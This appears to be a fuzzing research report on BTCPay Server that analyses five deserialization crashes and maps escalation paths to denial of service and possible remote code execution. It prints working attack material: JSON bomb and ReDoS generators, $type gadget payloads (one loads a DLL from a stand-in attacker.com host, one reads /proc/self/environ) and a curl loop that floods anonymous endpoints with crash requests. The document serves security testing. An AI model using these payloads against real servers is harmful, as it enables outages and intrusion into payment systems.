# BTCPay Server — Crash Escalation Analysis

> Research analysis of 5 crashes found during automated fuzzing. Covers realistic escalation paths to DDoS and potential RCE.

**→ [Back to README](README.md) · [BTCPay Report](BTCPAYSERVER_REPORT.md) · [BTCPay Quickstart](QUICKSTART_BTCPAYSERVER.md)**

> 📌 **Historical run report — 2026-07-13.** Point-in-time crash analysis, not living
> documentation; not guaranteed reproducible against the current pipeline (see
> `ARCHITECTURE_REVIEW.md` Top-20 #9/#10 for what's changed since).

---

## Table of Contents

1. [TL;DR](#tldr)
2. [Critical Code Findings](#critical-code-findings)
3. [Path 1: DDoS via Deep Nesting and Memory Exhaustion](#path-1-ddos-via-deep-nesting-and-memory-exhaustion)
4. [Path 2: RCE via Newtonsoft.Json `$type` Deserialization](#path-2-rce-via-newtonsoftjson-type-deserialization)
5. [Path 3: DDoS via ReDoS (Regex Injection)](#path-3-ddos-via-redos-regex-injection)
6. [Path 4: Application-Level DDoS via Crash Loop](#path-4-application-level-ddos-via-crash-loop)
7. [Fuzzer Improvement Recommendations](#fuzzer-improvement-recommendations)
8. [Overall Assessment](#overall-assessment)

---

## TL;DR

The fuzzer found **5 crashes** (500 Internal Server Error), all related to `Newtonsoft.Json` deserialization. Escalation potential:

| # | Bug | DDoS Potential | RCE Potential | Notes |
|---|-----|:-:|:-:|---|
| 1 | `$type` confusion in Pull Payments | Medium | **High** | Requires `TypeNameHandling` verification |
| 2 | Deep nesting + AssemblyInstaller | **High** | **High** | Gadget chain already formed |
| 3 | Regex injection in multipart | **High** | Low | Classic ReDoS vector |
| 4 | NullRef in Payouts (`Infinity`) | Medium | Low | Crash-loop DoS |
| 5 | Array overflow in subscriber-portal | **High** | Low | Memory exhaustion |

---

## Critical Code Findings

Static analysis of the BTCPay Server source code (instrumented copy in `btcpayserver_prep/`) revealed three architectural weaknesses that make escalation realistic.

### 1. `TypeNameHandling` is inherited, not hardcoded to `None`

In `BTCPayServer/Extensions.cs`:
```csharp
TypeNameHandling = settings.TypeNameHandling,  // copies from parent settings!
```

In `BTCPayServer/Data/BlobSerializer.cs`, `CreateSettings()` does **not** explicitly set `TypeNameHandling = None`, relying on the Newtonsoft.Json default. The default is `TypeNameHandling.None`, **however** if any plugin or `NBXplorer.Serializer.ConfigureSerializer()` changes it, the entire inheritance chain inherits the new value.

### 2. `MaxRequestBodySize = int.MaxValue` in PluginManager

In `BTCPayServer/Plugins/PluginManager.cs`:
```csharp
options.Limits.MaxRequestBodySize = int.MaxValue; // ~2 GB!
```

> [!CAUTION]
> This effectively disables memory-exhaustion protection. An attacker can send request bodies up to 2 GB to **any** endpoint and Kestrel will accept them.

### 3. `[AllowAnonymous]` on PullPayment endpoints

`GreenfieldPullPaymentController.cs` exposes 6 endpoints with `[AllowAnonymous]`:

| Endpoint | Line |
|----------|------|
| `POST /api/v1/pull-payments/{id}/boltcards` | 180 |
| `GET /api/v1/pull-payments/{id}` | 315 |
| `GET /api/v1/pull-payments/{id}/payouts` | 336 |
| `GET /api/v1/pull-payments/{id}/payouts/{payoutId}` | 355 |
| `GET /api/v1/pull-payments/{id}/lnurl` | 375 |
| `POST /api/v1/pull-payments/{id}/payouts` | 423 |

> [!WARNING]
> DDoS and potential RCE attacks against these endpoints **require no authentication**. Rate limiting is not applied to these routes (it is only applied to Login, Register, PublicInvoices, and PayJoin).

---

## Path 1: DDoS via Deep Nesting and Memory Exhaustion

The fuzzer confirmed that the server crashes when receiving:
- Arrays of 100+ elements
- Deep JSON nesting (100 levels of `{"a": {...}}`)

### A. JSON Bomb (Quadratic Memory Blowup)

```json
{"a": "AAAA...x100KB", "b": "AAAA...x100KB", ... (x1000 fields)}
```

Total payload ~100 MB. With `MaxRequestBodySize = int.MaxValue`, Kestrel passes it without restriction.

**Fuzzer vector:** Add a `json_bomb` mutator to `void/go/mutation_engine.go`:

```go
// Generates JSON with N repeating large fields
func mutateJsonBomb(body string) string {
    field := strings.Repeat("A", 100_000)
    var sb strings.Builder
    sb.WriteString("{")
    for i := 0; i < 500; i++ {
        if i > 0 { sb.WriteString(",") }
        fmt.Fprintf(&sb, `"f%d":"%s"`, i, field)
    }
    sb.WriteString("}")
    return sb.String()
}
```

### B. Hash Collision DoS (HashDoS)

Newtonsoft.Json uses `Dictionary<string, JToken>` inside `JObject`. Sending JSON with keys that collide in .NET's `string.GetHashCode()` degrades O(1) lookups to O(n²):

```json
{"AaAaAa": 1, "AaAaBB": 2, "AaBBAa": 3, ...}
```

**Target endpoint:** `POST /api/v1/pull-payments/{id}/boltcards` — anonymous, accepts a JSON body.

### C. Recursive Nesting Stack Overflow

The fuzzer already found a crash at 100 nesting levels. `MaxDepth` is not set explicitly anywhere in the codebase (Newtonsoft.Json default is 64). At 1,000 parallel requests, each needing ~1 KB stack frame per nesting level, this can exhaust thread-pool memory.

**Recommendation:** Add a `-deep-nest-levels` parameter and generate nesting at exactly the `MaxDepth` boundary (63–65 levels).

---

## Path 2: RCE via Newtonsoft.Json `$type` Deserialization

Crashes 1 and 2 confirmed that:
- `{"$type": "System.Configuration.Install.AssemblyInstaller, ..."}` **reaches the deserializer**
- The server crashes with `NullReferenceException` in `JsonSerializerInternalReader.CreateObject`, meaning Newtonsoft.Json **attempts** to resolve the type but fails

### Why This Is Not Yet RCE

The current behavior (`NullReferenceException`) indicates one of:
1. `TypeNameHandling = Auto` or `Objects` — the type is resolved, but the class is not found (assembly not loaded)
2. `TypeNameHandling = None` (default) — `$type` is ignored, but NullRef occurs from a different null value during deserialization

### Verification: Determine the Active `TypeNameHandling`

Send an **oracle payload** using a type that is definitely loaded in the process:

```json
{
    "$type": "Newtonsoft.Json.Linq.JObject, Newtonsoft.Json",
    "test": "value"
}
```

- **200 or 400 response** → `TypeNameHandling != None`; the type resolved successfully → **RCE is possible**
- **500 NullRef** → type was not resolved → likely `TypeNameHandling.None`

Additional oracle:

```json
{
    "$type": "System.String, mscorlib",
    "$value": "test"
}
```

### Gadget Chains for .NET on Linux

If `TypeNameHandling != None`, these are the most viable Linux-specific gadget chains for .NET running in Docker:

```json
{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"http://attacker.com/evil.dll"}
```

```json
{"$type":"System.IO.FileInfo, System.IO.FileSystem","FileName":"/proc/self/environ"}
```

> [!IMPORTANT]
> BTCPay Server runs in Docker on Linux. Windows-specific gadget chains (e.g., `PresentationFramework`, `ObjectDataProvider`) are **not available**. Only Linux-compatible .NET assemblies loaded into the process are viable gadget candidates.

### Through the NBXplorer Serializer

In `BTCPayServer/Data/BlobSerializer.cs`:
```csharp
network.Serializer.ConfigureSerializer(settings);  // NBXplorer may enable TypeNameHandling!
```

`NBXplorer.Serializer.ConfigureSerializer()` is third-party code. Its behavior with `TypeNameHandling` is a critical unknown and should be audited directly.

---

## Path 3: DDoS via ReDoS (Regex Injection)

**Crash 3** confirmed that `filename="{\"$regex\":\".*\"}"` in a multipart boundary triggers a server crash.

### Classic ReDoS Payloads

```
filename="(a+)+$aaaaaaaaaaaaaaaaaaaaaa!"
```
```
filename="(a|aa)+$" + "a" * 30
```

These cause exponential backtracking in the regex engine. A single request can hold a CPU thread for 10+ seconds.

### Fuzzer Automation

Add a ReDoS mutator for multipart boundaries in `void/go/mutation_engine.go`:

```go
var redosPayloads = []string{
    `(a+)+$` + strings.Repeat("a", 25) + "!",
    `([a-zA-Z]+)*$` + strings.Repeat("a", 30) + "1",
    `(a|aa)+$` + strings.Repeat("a", 25),
    `(.*a){20}` + strings.Repeat("a", 25),
}
```

---

## Path 4: Application-Level DDoS via Crash Loop

All 5 crashes return 500. With `[AllowAnonymous]` on 6 endpoints and no rate limiting, an attacker can maintain a continuous crash loop.

### Stability Verification Script

```bash
# 1000 parallel crash requests (unauthenticated)
for i in $(seq 1 1000); do
  curl -s -X POST "http://target/api/v1/pull-payments/\$\{\"\\$ne\":null\}/boltcards" \
    -H "Content-Type: application/json" \
    -d '{"$type":null,"UID":"'"$(python3 -c "print('A'*100000)")"'"}' &
done
wait
```

If BTCPay Server does not catch `NullReferenceException` at the middleware level (the crash data confirms it does **not**), each such request can exhaust a worker thread. At sufficient parallelism, this depletes the thread pool and causes a complete denial of service.

---

## Fuzzer Improvement Recommendations

### New mutators for `void/go/mutation_engine.go`

| Mutator | Target | Priority |
|---------|--------|----------|
| `json_bomb` | Memory exhaustion DoS | High |
| `json_hashdos` | CPU exhaustion via hash collisions | High |
| `redos_filename` | ReDoS in multipart | High |
| `type_oracle` | Determine `TypeNameHandling` | High |
| `linux_gadget_chain` | Linux-specific .NET RCE gadgets | Medium |
| `deep_nest_boundary` | Stack overflow at `MaxDepth` boundary | Medium |

### New `dict.json` entries

```json
{
    "restler_custom_payload": {
        "__dollar_type_oracle__": [
            "Newtonsoft.Json.Linq.JObject, Newtonsoft.Json",
            "System.String, mscorlib"
        ],
        "__redos__": [
            "(a+)+$aaaaaaaaaaaaaaaaaaa!",
            "([a-z]+)*$zzzzzzzzzzzzzzzzz1"
        ],
        "__hashdos_key__": [
            "AaAaAa", "AaAaBB", "AaBBAa", "AaBBBB",
            "BBAaAa", "BBAaBB", "BBBBAa", "BBBBBB"
        ]
    }
}
```

### Sequence Engine: Crash Amplification Chain

Train the sequence engine to build end-to-end exploit chains for the pull payment vulnerability:

1. `POST /api/v1/stores` → create a store (producer)
2. `POST /api/v1/stores/{storeId}/pull-payments` → create a pull payment (consumer → producer)
3. `POST /api/v1/pull-payments/{ppId}/boltcards` → **crash payload** (consumer, `[AllowAnonymous]`)

This enables the fuzzer to automatically build a complete exploit: create a legitimate pull payment, then attack its anonymous endpoint.

---

## Overall Assessment

> [!IMPORTANT]
> **DDoS** is realistic right now. The combination of `MaxRequestBodySize = int.MaxValue` + `[AllowAnonymous]` + no rate limiting on PullPayment endpoints creates a guaranteed application-level denial of service vector.

> [!WARNING]
> **RCE** requires one of:
> 1. Confirming `TypeNameHandling != None` (via oracle payload)
> 2. Finding a path through the NBXplorer serializer that enables `TypeNameHandling`
> 3. Locating another deserializer (`BinaryFormatter`, `DataContractSerializer`) in the codebase
>
> The current `NullReferenceException` crashes are a **borderline signal**: they show the deserializer *processes* `$type`, but cannot resolve the type. This can indicate either `TypeNameHandling.None` with a side-effect null, or `TypeNameHandling.Auto` with an unavailable assembly.

---

**→ [Back to README](README.md) · [BTCPay Report](BTCPAYSERVER_REPORT.md) · [BTCPay Quickstart](QUICKSTART_BTCPAYSERVER.md)**
